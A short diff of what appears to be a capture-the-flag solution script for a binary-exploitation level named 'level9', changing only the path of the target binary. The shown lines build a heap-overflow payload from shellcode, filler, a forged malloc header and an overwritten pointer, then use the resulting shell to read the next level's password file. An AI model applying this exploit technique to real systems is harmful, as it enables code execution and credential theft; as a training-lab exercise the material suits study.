@@ -39,7 +39,7 @@ BADD="$(hex_little_endian "${POINTER_SHELLCODE_ADDRESS}")"
 
 # We print our exploit to the input and wait for the reverse shell to open with cat
 INPUT="${SHELLCODE}${ASTR_FILLER}${AVAL_FILLER}${MALLOC_HEADER}${BADD}"
-./level9 "${INPUT}"
+/home/user/level9/level9 "${INPUT}"
 
 # We use the reverse shell to retrieve the password
 # $> cat /home/user/bonus0/.pass
